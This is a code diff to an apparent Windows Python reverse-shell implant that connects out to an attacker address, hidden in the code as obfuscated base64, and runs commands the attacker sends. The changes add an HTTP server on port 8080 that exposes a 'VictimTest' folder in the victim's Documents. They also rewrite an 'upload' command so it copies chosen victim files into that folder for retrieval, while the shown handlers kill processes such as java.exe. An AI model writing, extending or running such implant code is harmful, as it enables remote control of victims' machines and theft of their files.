@@ -11,6 +11,33 @@ import win32con
 import win32process
 import win32gui
 import requests
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import threading
+import shutil
+
+# Get the path to the Documents folder
+documents_path = os.path.expanduser('~\\Documents')
+
+# Create a new folder inside Documents
+folder_name = "VictimTest"
+new_folder_path = os.path.join(documents_path, folder_name)
+
+# Create the folder if it doesn't exist
+if not os.path.exists(new_folder_path):
+    os.makedirs(new_folder_path)
+
+# Change the working directory to the new folder
+os.chdir(new_folder_path)
+
+# Verify the current working directory
+print("Current working directory:", os.getcwd())
+
+# Set up the server
+def start_server():
+    server_address = ('', 8080)  # Listen on all available interfaces, port 8000
+    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
+    print("Server started on port 8080...")
+    httpd.serve_forever()
 
 # Obfuscated target IP and port
 #encoded_target = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
@@ -122,21 +149,6 @@ def handle_connection(s):
                     except Exception as e:
                         output = f"{str(e)}\n"  # Send the error message if the directory change fails
 
-
-                elif command.startswith("upload "):
-                    # Handle file upload
-                    try:
-                        file_name = command[7:].strip()
-                        # Notify the attacker that the target is ready to receive the file
-                        s.send(b"READY\n")
-                        # Receive the file data
-                        file_data = s.recv(1024 * 1024)  # Receive up to 1MB of data
-                        with open(file_name, "wb") as f:
-                            f.write(file_data)
-                        output = f"File uploaded: {file_name}\n"
-                    except Exception as e:
-                        output = f"{str(e)}\n"
-
                 if command == ("kill"):
                     try:
                         subprocess.run("taskkill /F /IM java.exe", shell=True, check=False)
@@ -192,6 +204,39 @@ def handle_connection(s):
                         print(f"Error: {e}")
                         output = f"Error: {e}"
 
+
+                elif command.startswith("upload "):
+                    try:
+                        # Extract the file path from the command
+                        file_path = command[len("upload "):].strip()
+
+                        # Check if the file exists on the client machine
+                        if os.path.exists(file_path):
+                            # Define the current working directory
+                            current_working_dir = os.getcwd()
+                
+                            # Get the file name from the path
+                            file_name = os.path.basename(file_path)
+                
+                            # Define the destination path in the current working directory
+                            destination_path = os.path.join(current_working_dir, file_name)
+                
+                            # Copy the file to the current working directory
+                            shutil.copy(file_path, destination_path)
+                
+                            # Set output for success
+                            output = f"File '{file_name}' uploaded successfully to {current_working_dir}."
+                
+                        else:
+                            # Handle the case where the file doesn't exist
+                            output = f"Error: File '{file_path}' not found on the client machine."
+                
+                    except Exception as e:
+                        # Catch any unexpected exceptions and suppress default system error message
+                        output = "An error occurred during the file upload, but no specific error message was provided."
+                        # Optionally, you can log the actual error message for debugging purposes:
+                        # print(f"Error: {str(e)}")
+
                 elif command.startswith("pidtxt "):
                     output = "Make you set your PID file\n"
                     with open("PID.txt", "r") as file:
@@ -229,5 +274,7 @@ def handle_connection(s):
 
 # Main loop
 while True:
+    server_thread = threading.Thread(target=start_server, daemon=True)
+    server_thread.start()
     s = connect_to_attacker()  # Connect to the attacker
     handle_connection(s)       # Handle the connection
